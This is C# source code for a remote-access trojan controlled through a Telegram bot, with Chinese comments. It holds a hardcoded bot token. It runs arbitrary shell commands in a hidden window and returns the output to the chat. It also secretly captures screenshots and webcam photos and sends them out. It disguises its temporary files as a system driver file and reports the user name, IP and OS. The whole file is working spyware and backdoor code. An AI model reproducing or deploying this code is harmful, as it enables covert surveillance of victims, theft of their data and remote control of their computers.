using System;
using System.Diagnostics;
using System.Net;
using System.Threading;
using System.Drawing;
using System.Windows.Forms;
using System.IO;
using Telegram.Bot;
using Telegram.Bot.Args;
using Telegram.Bot.Types.InputFiles;
using AForge.Video;
using AForge.Controls;
using AForge.Video.DirectShow;
using System.Drawing.Imaging;

namespace TGbot
{
    class Program
    {
        static ITelegramBotClient botClient;
        private static FilterInfoCollection videoDevices;
        static private VideoCaptureDevice videoSource;
        static VideoSourcePlayer vid;
        public static int selectedDeviceIndex = 0;
        static string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\MSconfig.sys";       //伪装成AppData\Roaming下的驱动文件

        static void Main()
        {
            botClient = new TelegramBotClient("530499363:AAE1RX956iyCO3yc_HEA_WkggnG_TfRg_lg");
            botClient.OnMessage += Bot_OnMessage;
            botClient.StartReceiving();
            Thread.Sleep(int.MaxValue);      //2147483647 ms == 24 days;
                                             //So,If the program Sleep for 24 days,the program ends on it's own.
        }

        static async void Bot_OnMessage(object sender, MessageEventArgs e)
        {
            if (e.Message.Text != null)
            {
                Console.WriteLine($"Received a text message in chat {e.Message.Chat.Id}.");
                System.Net.IPAddress[] addressList = Dns.GetHostAddresses(Dns.GetHostName());
                if (e.Message.Text.Contains("/command "))
                {
                    if (e.Message.Text.Substring(0, 9).ToLower().Equals("/command "))
                    {
                        string command = e.Message.Text.Substring(9);
                        RunCmd(command, out string re);
                        await botClient.SendTextMessageAsync(
                        chatId: e.Message.Chat,
                        text: $"return:\n{re}"
                        );
                    }
                }
                else if (e.Message.Text.ToLower().Equals("/help"))
                {
                    await botClient.SendTextMessageAsync(
                      chatId: e.Message.Chat,
                      text: "/whoami - returns the current logged in user\n" +
                            "/sysinfo - returns system information\n" +
                            "/command <argument> - executes an arbitrary command\n" +
                            "/getscr - Get Screen Picture\n" +
                            "/getpic - Get Camera Picture\n" +
                            "/help - This help message."
                );
                }
                else if (e.Message.Text.ToLower().Equals("/whoami"))
                {
                    await botClient.SendTextMessageAsync(
                      chatId: e.Message.Chat,
                      text: $"{Environment.UserDomainName}\\{Environment.UserName}"
                );
                }
                else if (e.Message.Text.ToLower().Equals("/getscr"))
                {
                    Bitmap bb = getScreen();
                    bb.Save(path);
                    using (FileStream fs = System.IO.File.OpenRead(path))
                    {
                        InputOnlineFile inputOnlineFile = new InputOnlineFile(fs, "pic.jpg");
                        await botClient.SendDocumentAsync(e.Message.Chat, inputOnlineFile);
                    }
                    File.Delete(path);        //选择是否截图后删除该文件
                }
                else if (e.Message.Text.ToLower().Equals("/getpic"))
                {
                    //检测是否存在摄像头
                    if (GetDevices())
                    {
                        vid = new VideoSourcePlayer();
                        CameraConn();//初始化摄像头
                        GrabBitmap();//进行拍照，并保存到本地
                        Thread.Sleep(2000);
                        StopCamera();//关闭摄像头
                        using (FileStream fs = System.IO.File.OpenRead(path))
                        {
                            InputOnlineFile inputOnlineFile = new InputOnlineFile(fs, "pic.jpg");
                            await botClient.SendDocumentAsync(e.Message.Chat, inputOnlineFile);
                        }
                        File.Delete(path);        //选择是否截图后删除该文件
                    }
                    else
                    {
                        await botClient.SendTextMessageAsync(
                      chatId: e.Message.Chat,
                      text: "目标服务上摄像头不存在！"
                     );
                    }
                }
                else if (e.Message.Text.ToLower().Equals("/sysinfo"))
                {
                    await botClient.SendTextMessageAsync(
                      chatId: e.Message.Chat,
                      text: $"IPv4: {addressList[1]}\n" +
                              $"OS: {Environment.OSVersion.Platform}"
                );
                }
                else
                {
                    await botClient.SendTextMessageAsync(
                    chatId: e.Message.Chat,
                    text: "You said:\n" + e.Message.Text
                    );
                }
            }
        }


        public static void RunCmd(string cmd, out string output)
        {
            cmd = cmd.Trim().TrimEnd('&') + "&exit";//说明：不管命令是否成功均执行exit命令，否则当调用ReadToEnd()方法时，会处于假死状态
            using (Process p = new Process())
            {
                p.StartInfo.FileName = "cmd.exe";
                p.StartInfo.UseShellExecute = false;        //是否使用操作系统shell启动
                p.StartInfo.RedirectStandardInput = true;   //接受来自调用程序的输入信息
                p.StartInfo.RedirectStandardOutput = true;  //由调用程序获取输出信息
                p.StartInfo.RedirectStandardError = true;   //重定向标准错误输出
                p.StartInfo.CreateNoWindow = true;          //不显示程序窗口
                p.Start();//启动程序

                //向cmd窗口写入命令
                p.StandardInput.WriteLine(cmd);
                p.StandardInput.AutoFlush = true;

                //获取cmd窗口的输出信息
                output = p.StandardOutput.ReadToEnd();
                p.WaitForExit();//等待程序执行完退出进程
                p.Close();
            }
        }

        public static Bitmap getScreen()
        {
            Bitmap baseImage = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            Graphics g = Graphics.FromImage(baseImage);
            g.CopyFromScreen(new System.Drawing.Point(0, 0), new System.Drawing.Point(0, 0), Screen.AllScreens[0].Bounds.Size);
            g.Dispose();
            return baseImage;
        }

        public static bool GetDevices()
        {
            try
            {
                //枚举所有视频输入设备
                videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
                if (videoDevices.Count != 0)
                {
                    Console.WriteLine("已找到视频设备.");
                    return true;
                }

                return false;
            }
            catch (Exception ex)
            {
                Console.WriteLine("error:没有找到视频设备！具体原因：" + ex.Message);
                return false;
            }

        }
        //启动摄像头
        private static void CameraConn()
        {
            videoSource = new VideoCaptureDevice(videoDevices[selectedDeviceIndex].MonikerString);
            vid.VideoSource = videoSource;
            vid.Start();
        }
        //关闭摄像头
        private static void StopCamera()
        {
            vid.SignalToStop();
            vid.WaitForStop();
        }

        public static void GrabBitmap()
        {
            if (videoSource == null)
            {
                return;
            }
            videoSource.NewFrame += new NewFrameEventHandler(videoSource_NewFrame); //新建事件
        }

        static void videoSource_NewFrame(object sender, NewFrameEventArgs eventArgs)
        {
            Bitmap bmp = (Bitmap)eventArgs.Frame.Clone();   //Clone摄像头中的一帧
            bmp.Save(path, ImageFormat.Png);
            //如果这里不写这个，一会儿会不停的拍照，
            videoSource.NewFrame -= new NewFrameEventHandler(videoSource_NewFrame);
        }
    }
}
